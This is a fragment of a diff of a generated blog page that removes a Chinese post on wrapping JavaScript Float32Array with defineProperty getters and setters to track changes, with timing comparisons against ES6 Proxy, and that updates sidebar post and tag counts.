&#125;(key),</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">            b.isDirty = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'set member'</span>,i);</span><br><span class="line">            a[i] = v;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;(key)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.constructor = a.constructor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> idx <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(b, idx, &#123;</span><br><span class="line">      configurable: <span class="literal">true</span>,</span><br><span class="line">      enumerable: <span class="literal">true</span>,</span><br><span class="line">      get: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'get index'</span>,i);</span><br><span class="line">          <span class="keyword">return</span> a[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx),</span><br><span class="line">      set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'set index'</span>,i);</span><br><span class="line">          b.isDirty = <span class="literal">true</span>;</span><br><span class="line">          a[i] = v;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">&gt;&gt;a = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span> &#123;a: <span class="built_in">Float32Array</span>[<span class="number">3</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line">&gt;&gt;a.toString()</span><br><span class="line">&lt;&lt;t.js:<span class="number">64</span> invoke toString</span><br><span class="line">&lt;&lt;<span class="string">"1,2,3"</span></span><br><span class="line">&gt;&gt;a[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">&lt;&lt;t.js:<span class="number">100</span> set index <span class="number">0</span></span><br><span class="line">&lt;&lt;<span class="number">1</span></span><br><span class="line">&gt;&gt;a[<span class="number">2</span>]</span><br><span class="line">&lt;&lt;t.js:<span class="number">94</span> get index <span class="number">2</span></span><br><span class="line">&lt;&lt;<span class="number">3</span></span><br><span class="line">&gt;&gt;a.constructor</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span>() &#123; [native code]  &#125;</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
-<p>本做法应该还有以下局限：</p>
-<h2 id="性能">性能</h2><p>大规模下创建一个1000000的数组内存占用飙升，因为创建了太多的get/set函数。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ori = <span class="keyword">new</span> _Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array[<span class="number">1000000</span>]</span><br><span class="line">mod = <span class="keyword">new</span> Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array &#123;a: Float32Array[<span class="number">1000000</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t = mod[i];t++;mod[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM741:<span class="number">2</span> a: <span class="number">5313.409</span>ms</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t=ori[i];t++;ori[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM743:<span class="number">2</span> a: <span class="number">3884.074</span>ms</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-<h2 id="内部创建并返回的TypedArray无法Hook">内部创建并返回的TypedArray无法Hook</h2><p>比如类似<code>subarray()</code>函数，返回值便是原生的TypedArray了，需要在Proxy对象中特殊处理一下。</p>
-<h2 id="在某些场景下不能完全替代原有的TypedArray">在某些场景下不能完全替代原有的TypedArray</h2><p>可以尽量模拟原生TypedArray的对外Api，不过还是有些场景可能照顾不到。</p>
-<h1 id="ES6_Proxy_&amp;_Reflect">ES6 Proxy &amp; Reflect</h1><p>Chrome中还没有实现，使用Firefox一试。对某对象加一层通用的代理，非常容易实现。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> ori = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Proxy</span>(aa, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver);          </span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, value, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, value, receiver);              </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = aa[i];t++;aa[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">1738.62</span>ms</span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = obj[i];t++;obj[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">3226.16</span>ms</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
-<p>如果还有更好的方法，欢迎讨论。</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
@@ -1147,7 +1181,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">38</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1161,7 +1195,7 @@
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-count">30</span>
               <span class="site-state-item-name">tags</span>
               </a>
           </div>
